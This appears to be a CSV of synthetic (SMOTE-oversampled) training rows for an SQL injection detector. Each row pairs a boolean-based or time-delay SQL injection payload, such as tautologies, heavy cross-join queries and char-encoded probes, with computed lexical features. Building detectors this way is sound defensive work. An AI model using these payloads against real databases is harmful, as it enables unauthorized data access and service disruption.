id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000115,attack,boolean,"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001107,0.6292064246914987,118.92132209217075,32.73033052304269,3.4862101602536484,31.26966947695731,15.0,54.921322092170755,17.73033052304269,0.2630602983029874,0.12616236843516082,0.4617072280099805,0.14907010525187134,2.0,0.0,2.0,1.0,0.0,1.0,0.0,10.730330523042689,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.26966947695731125,0.7303305230426886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000116,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",nearest_attack_euclidean,R000472,1.1881884692683842,121.8731027806101,27.58731027806101,4.020332631663401,67.69848222448807,8.301517775511924,29.52386166836606,16.349241112244037,0.5550778915477683,0.06955567363242007,0.24165758629136563,0.13370884852844603,1.7619308341830289,0.0,0.0,0.0,1.0,1.0,0.0,3.5873102780610093,0.0,5.0,4.0,1.9999999999999996,0.5873102780610098,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000117,attack,boolean,1  )   and 8417  =  5276#,nearest_attack_euclidean,R000540,0.04056704898202689,25.199482061530873,14.046936955654324,3.160211214021299,3.1525451058765483,9.0,10.035202716740741,3.0117342389135793,0.12306207758316307,0.35829015375830675,0.3989383307649617,0.11970943789356846,0.011734238913581274,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.011734238913581108,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000118,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",nearest_attack_euclidean,R000229,0.425688537102647,70.14823302067289,24.0,3.754306182934716,21.0,13.0,24.918586416538318,11.229646604134581,0.30086298702826625,0.18624851577940293,0.35300356212943296,0.15988493506289783,4.0,0.0,0.0,0.0,0.0,2.0,0.0,3.2296466041345804,0.0,1.0,1.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000119,attack,boolean,1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',nearest_attack_euclidean,R001094,1.3413617186408884,365.1565029370429,30.179708578086906,3.287606804177103,88.89854289043454,55.0,170.488397179478,50.76956286713036,0.24326988650156098,0.15077980883922235,0.46690036792647094,0.1390499367327457,1.589854289043454,0.0,0.8202914219130919,0.0,0.0,2.0,0.0,35.1797085780869,0.0,0.0,0.0,14.0,1.0,0.0,0.41014571095654606,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.589854289043454,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.589854289043455
SMOTE_000120,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711",nearest_attack_euclidean,R000927,0.2382001216237337,118.15411972371102,32.0,3.7215725692067747,37.733664679143615,18.443892201427314,47.79900596256917,14.177556880570926,0.3198541892149102,0.15589488708351068,0.4042892880082955,0.11996163569328364,2.0,0.0,0.0,1.0,0.0,1.0887784402854628,0.0,9.088778440285463,0.0,0.0,1.0,2.0887784402854623,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9112215597145372,0.0,0.0,0.0,1.0887784402854628,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,1.1920928955078125e-07,63.0,22.0,3.48889649539661,26.0,4.0,24.0,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000122,attack,boolean,"-1072%""   )    )    or 3090  =  3539",nearest_attack_euclidean,R000701,0.010659288620086086,35.99388507024857,15.0,3.016864209524667,2.0,12.0,16.0,5.993885070248556,0.05556526179325627,0.3333915707595375,0.44452209434605006,0.16652107310115608,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.9938850702485557,0.0,0.0,1.9999999999999996,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000123,attack,boolean," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",nearest_attack_euclidean,R000004,0.7169970824573484,61.271065081961154,22.378510846993528,3.5944658237880462,26.0,4.378510846993526,21.514043387974105,9.378510846993526,0.42528091469856844,0.07125107683044939,0.35043214035234654,0.15303586811863565,0.0,1.6214891530064737,2.0,0.0,1.0,2.3785108469935263,0.0,0.0,0.0,0.0,0.0,5.378510846993526,0.0,1.0,1.0,1.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000124,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001477,0.9334431052798499,162.36517115195883,35.52696576960823,4.246215364703353,79.65561980637119,18.0,41.47303423039177,23.236517115195884,0.4904564639399486,0.11093481320826254,0.25546740660413125,0.14314131624765764,3.0,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,5.0,4.0,6.236517115195884,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.23651711519588417,2.0,0.0,1.0,1.2365171151958843,0.7634828848041157,0.2365171151958842,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.236517115195884
SMOTE_000125,attack,boolean,"1""  )   and 4760  =  2922",nearest_attack_euclidean,R000672,0.02754656968504714,25.09463351694785,14.0,3.121786495434362,3.0,9.0,10.070975137710882,3.0236583792369593,0.1196558781201896,0.3589676343605689,0.4010036888161136,0.12037279870312789,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0118291896184815,0.011829189618481228,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000126,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000138,0.39505364299422535,142.65121618762228,30.223252254158513,4.033338696682457,82.09772069593932,8.0,37.330243237524456,15.223252254158513,0.5749196824040179,0.05619524576487617,0.2618147703413638,0.10707030148974217,1.0,0.0,2.0,0.0,1.0,1.0,0.0,5.0,0.2232522541585139,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000127,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000008,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000128,attack,boolean,admin'  )   or '1'  =  '1'--,nearest_attack_euclidean,R000030,0.018537042191557416,28.089264498574238,13.017852899714848,3.0615486901794493,7.0,2.0,10.071411598859385,9.017852899714848,0.24932375379868,0.07123535822819428,0.35834077898519545,0.3211001089879303,5.0,0.0,2.0,0.0,0.0,1.0,0.0,1.017852899714848,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000129,attack,boolean,"-8612""  )   or 4043  =  3083 and   (  ""pjzo"" like ""pjzo",nearest_attack_euclidean,R000481,0.5132968062873322,59.23026927574192,26.3016213156129,3.9713573259036474,19.27783730232257,13.301621315612898,18.0,8.65081065780645,0.32336001977008794,0.22375025161759526,0.30691314252316726,0.14597658608914957,0.0,4.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.32540532890322454,0.3254053289032246,1.9999999999999996,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,boolean,1   )    )     )   and 8990  =  4775 and    (    (     (  1894  =  1894,nearest_attack_euclidean,R000954,0.8960561170772147,81.63368914801774,17.23634017548366,2.7622635532418185,9.236340175483662,18.849337243133522,43.698674486267045,9.849337243133522,0.10937638860821597,0.23202430757359577,0.5389958529523899,0.11960345086579832,0.0,0.0,0.0,0.0,0.0,2.0,0.0,6.92466862156676,0.0,0.4623343107833803,0.4623343107833804,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001187,0.3297038302894712,130.41372705533658,30.0,3.969234606339141,65.0,8.0,41.17810587944716,16.23562117588943,0.4994343716593268,0.06146884574268639,0.314689947379417,0.12440683521856977,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.235621175889431,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000132,attack,boolean,"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'aezm' like 'aezm",nearest_attack_euclidean,R000359,0.6881589926310347,139.59855308107277,30.59855308107277,4.133415276608734,75.39421232429109,10.0,34.802893837854455,19.40144691892723,0.5400360297100796,0.07163486480931512,0.24933475501249486,0.13899435046811046,4.0,0.0,0.0,0.0,1.0,1.4014469189272298,0.0,4.0,0.0,5.0,4.0,2.4014469189272294,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000133,attack,boolean,"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --",nearest_attack_euclidean,R000897,0.22553698249132073,59.67946304872899,24.572617398305326,3.806565494052051,10.679463048728998,21.0,20.0,8.0,0.17874084485021072,0.3519682093499097,0.3352078184284854,0.13408312737139416,0.0,1.0,2.0,0.0,0.10684565042366889,2.0,0.0,2.0,0.0,0.0,0.8931543495763312,4.106845650423669,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000523,1.1466797155566304,156.17917565627727,38.0,4.250987992610612,64.84904864643168,18.0,51.018816201805976,22.31131080803961,0.41896239772061095,0.11668468727293914,0.3214957721493071,0.14285714285714285,4.0,4.0,1.0,0.0,0.0,1.537737838392078,0.0,6.7735729696475335,0.0,0.0,0.0,6.5377378383920774,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000135,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000322,0.15541633284539003,59.16378361544912,19.832756723089823,3.5953789656098167,7.0,23.665513446179645,19.665513446179645,8.832756723089823,0.11861783823061875,0.4,0.3322183781539321,0.1491637836154491,1.0,0.0,3.0,0.0,0.9163783615449113,2.0,0.0,1.9163783615449113,0.0,0.0,0.0,5.916378361544911,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000136,attack,boolean,"1'||  (  select 'vekn' from dual where 4929  =  4929 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R000271,0.37563723347202904,179.86707273351382,38.25176161477471,4.058958594209044,60.0,23.874119192612646,64.24471515567588,31.748238385225292,0.3336751778231135,0.13273820597001662,0.35709025168633357,0.1764963645205363,3.8741191926126466,0.0,0.25176161477470693,0.0,0.0,2.0,0.0,11.874119192612646,0.0,1.9999999999999998,1.0,12.0,1.0,0.0,0.12588080738735333,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000137,attack,boolean,-3044'  )   or 4999  =  3051#,nearest_attack_euclidean,R000403,0.22181905137314048,28.999999999999986,14.969820970796533,3.326140955592664,2.0,12.0,10.0,5.0,0.06896551724137931,0.41379310344827586,0.3448275862068966,0.1724137931034483,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.9999999999999996,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000138,attack,boolean,"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""rphs""  =  ""rphs",nearest_attack_euclidean,R001164,0.3027483746550336,212.9895400877548,32.31916320702038,3.6901327394808385,64.63832641404076,27.0,86.87246886318346,34.47874481053057,0.30372714298691805,0.12698405957613834,0.40733702664364163,0.16195177079330197,0.0,4.0,0.0,0.0,0.0,1.8404183964898082,0.0,18.638326414040765,0.0,1.0,3.0,7.840418396489809,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000139,attack,boolean,-7293'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000339,0.12476353491518091,39.94249792310653,13.057502076893458,2.6559204713568,2.0,12.0,20.0,5.942497923106542,0.05007372061140186,0.30044232366841117,0.5007372061140187,0.1487467496061682,0.9424979231065417,0.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.9999999999999996,0.9424979231065418,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000140,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000270,0.13113272517032773,227.94320563586308,28.943205635863094,3.494915507740527,119.9432056358631,12.0,73.0,23.0,0.5261972758457611,0.052644747128248764,0.32025554503017994,0.10090243199581012,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,0.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.9432056358630934,0.05679436413690658,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000141,attack,boolean,"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001148,0.6785258057233721,205.18810477599231,32.4899629366474,3.590038993180536,56.71821596605011,26.503345687784197,86.483271561079,35.483271561079,0.2750939143600381,0.1301913139584372,0.42232899239704236,0.17238577928448232,0.0,1.0,2.0,0.0,0.0,1.0,0.0,19.7449814683237,0.24832715610790035,1.2483271561079003,3.2483271561079006,9.993308624431602,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.496654312215801,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.496654312215801
SMOTE_000142,attack,boolean,"1' where 4860  =  4860 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000727,0.5931599578862078,197.36616768288667,32.28051397357389,3.7087887231840813,114.68308384144335,20.0,46.68308384144334,16.0,0.5811265468189823,0.101408183523728,0.23633872283830717,0.0811265468189824,0.7194860264261096,0.0,2.0,0.0,1.0,2.0,0.0,4.28051397357389,0.0,0.0,6.0,5.0,0.7194860264261096,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000143,attack,boolean,1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',nearest_attack_euclidean,R000240,0.6119660706882435,51.86595090430521,16.0,3.09024902658395,6.0,12.170688486975461,22.487934539073617,11.207327878256134,0.11620484561836225,0.23772103816705265,0.42951786741273784,0.21655624880184726,4.0,0.0,0.0,0.0,0.7926721217438653,2.0,0.0,2.4146557565122695,2.0,0.0,0.0,2.792672121743865,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""kngx"" like ""kngx",nearest_attack_euclidean,R001214,0.00041486446168372156,90.00700063871699,27.000488416654676,3.9720149772897857,44.00227927772181,8.000651222206232,27.00276769437649,11.001302444412465,0.4888823931118318,0.08888905333894097,0.3000037926293261,0.12222476091990118,0.0,3.0,0.0,0.0,0.9999185972242209,0.0,0.0,5.000732624982011,0.0,1.0000814027757792,1.0002442083273373,1.000244208327337,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.140277577908805e-05,0.9999185972242208,0.0,0.0,0.9999185972242209,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0002442083273370699,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.000081402775779
SMOTE_000145,attack,boolean,"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # miji",nearest_attack_euclidean,R001182,0.16546606269288827,122.3236539958715,30.0,4.092135202320915,69.70075799781432,8.0,32.46717199854288,12.155723999514294,0.5698562457791592,0.06548154078530531,0.2653114674784885,0.09935074595704704,0.0778619997571468,0.0,0.0,0.0,1.0,1.0,0.0,4.077861999757147,0.0,0.0,2.0,1.9999999999999996,0.07786199975714675,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
